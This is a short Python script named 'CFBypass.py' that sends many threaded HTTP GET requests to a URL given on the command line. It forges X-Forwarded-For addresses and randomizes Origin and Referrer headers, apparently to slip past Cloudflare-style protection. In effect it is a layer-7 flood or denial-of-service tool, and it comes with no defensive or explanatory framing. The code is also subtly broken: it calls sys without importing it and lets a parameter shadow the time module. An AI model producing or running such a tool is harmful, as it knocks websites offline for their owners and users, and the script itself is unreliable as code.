import requests
import random
import time
import threading
import os

def random_string(length):
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(characters) for _ in range(length))

def random_ip():
    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def main(url, time):
    if len(sys.argv) <= 2:
        print("Usage: python CFBypass.py <url> <time>")
        sys.exit(-1)

    def send_request():
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Upgrade-Insecure-Requests': 1,
            'cookie': 'cookie_value',
            'Origin': f"http://{random_string(10)}.com",
            'Referrer': f"http://google.com/{random_string(10)}",
            'X-Forwarded-For': random_ip()
        }
        response = requests.get(url, headers=headers)
        print(response.status_code)

    threads = []
    for _ in range(int(time)):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("CFBypass completed.")

if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2])
